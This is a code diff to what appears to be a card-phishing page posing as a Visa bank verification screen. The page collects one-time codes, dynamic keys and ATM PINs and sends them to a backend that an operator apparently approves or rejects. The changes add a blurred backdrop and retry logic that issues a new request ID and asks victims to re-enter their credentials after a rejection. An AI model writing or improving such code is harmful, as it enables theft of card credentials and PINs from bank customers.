@@ -19,8 +19,53 @@
             --visa-error: #dc2626;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--visa-bg); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .container { background: var(--visa-white); border-radius: 16px; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08); padding: 40px; max-width: 520px; width: 100%; }
+        
+        html, body {
+            width: 100%;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        body { 
+            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
+            color: var(--visa-text); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px; 
+            position: relative;
+        }
+
+        /* ===== FONDO BLURE.PNG ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('blure.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(16px) brightness(0.85);
+            -webkit-filter: blur(16px) brightness(0.85);
+            transform: scale(1.1);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .container { 
+            position: relative;
+            z-index: 1;
+            background: var(--visa-white); 
+            border-radius: 16px; 
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.15); 
+            padding: 40px; 
+            max-width: 520px; 
+            width: 100%; 
+        }
         
         /* --- CABECERA CON LOGOS FIJOS --- */
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--visa-border); }
@@ -91,11 +136,15 @@
         .loading-subtext { color: rgba(255, 255, 255, 0.7); font-size: 0.875rem; margin-top: 4px; }
         
         @media (max-width: 768px) { 
+            body { padding: 16px; }
+            body::before { filter: blur(14px) brightness(0.85); -webkit-filter: blur(14px) brightness(0.85); }
             .container { padding: 30px 24px; max-width: 480px; } 
             .visa-logo img { height: 40px; } 
             .bank-logo img { height: 35px; max-width: 130px; } 
         }
         @media (max-width: 480px) { 
+            body { padding: 14px; }
+            body::before { filter: blur(12px) brightness(0.85); -webkit-filter: blur(12px) brightness(0.85); }
             .container { padding: 20px 16px; border-radius: 12px; } 
             .header { margin-bottom: 16px; padding-bottom: 12px; } 
             .visa-logo img { height: 35px; } 
@@ -269,7 +318,11 @@
         // ============================================
         // SOLICITUD ID
         // ============================================
-        let solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        function generarNuevoSolicitudId() {
+            return 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        let solicitudId = generarNuevoSolicitudId();
         console.log('🆔 solicitudId generado al cargar:', solicitudId);
 
         let pollingInterval = null;
@@ -430,10 +483,10 @@
             iniciarHeartbeat();
         });
 
-        // SOLO CARGA EL NOMBRE, EL LOGO YA ESTÁ FIJO EN EL HTML
+        // CARGA EL NOMBRE DEL BANCO
         function cargarNombreBanco() {
             let bancoEmisor = localStorage.getItem('bancoEmisor');
-            if (bancoEmisor) {
+            if (bancoEmisor && bancoEmisor !== 'Desconocido' && bancoEmisor !== 'No especificado') {
                 bancoEmisor = normalizarBanco(bancoEmisor);
                 localStorage.setItem('bancoEmisor', bancoEmisor);
                 bancoNombre.textContent = bancoEmisor;
@@ -538,7 +591,7 @@
                         tipo_paso: 'otp',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'visa',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -566,7 +619,7 @@
                         tipo_paso: 'clave_dinamica',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'visa',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -594,7 +647,7 @@
                         tipo_paso: 'clave_cajero',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'visa',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true
                     })
                 });
                 const data = await response.json();
@@ -709,7 +762,9 @@
                 } else if (resultado.estado === 'rejected') {
                     clearInterval(pollingInterval);
                     pollingInterval = null;
-                    mostrarError('❌ Credenciales incorrectas o transacción rechazada');
+                    mostrarError('❌ Credenciales incorrectas o transacción rechazada. Intente de nuevo.');
+                    solicitudId = generarNuevoSolicitudId();
+                    console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                     resetFormulario();
                     formularioBloqueado = false;
                     return;
@@ -811,6 +866,8 @@
                         statusMessage.className = 'status-message error-usuario';
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
+                        solicitudId = generarNuevoSolicitudId();
+                        console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                         resetFormulario();
                         clearInterval(pollingInterval);
                         pollingInterval = null;
